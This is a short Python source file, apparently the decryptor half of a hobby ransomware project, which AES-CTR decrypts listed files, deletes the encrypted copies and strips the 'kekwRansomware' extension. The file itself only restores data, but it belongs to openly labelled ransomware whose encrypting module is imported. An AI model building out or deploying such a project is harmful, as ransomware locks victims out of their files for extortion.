
import pyaes
from encrypter import Encrypter as crypter
import time

class Descrypter(crypter):
    def __init__(self, key):
        super().__init__(key)


    def descrypterData(self,file):
        aes = pyaes.AESModeOfOperationCTR(self.key)
        descrypterData = aes.decrypt(file)
        return descrypterData

    def descrypterFileCreator(self,fileName,data):
        file = fileName.replace("kekwRansomware","")

        with open(f"{file}","wb") as newData:
            newFile =  newData.write(data)


    def descrypterFiles(self):
        for x in self.officialLIst:
            
            with open(x,"rb") as file:
                fileData = file.read()

    
            self.removeFiles(x)
            self.descrypterFileCreator(x,self.descrypterData(fileData))
            time.sleep(1)

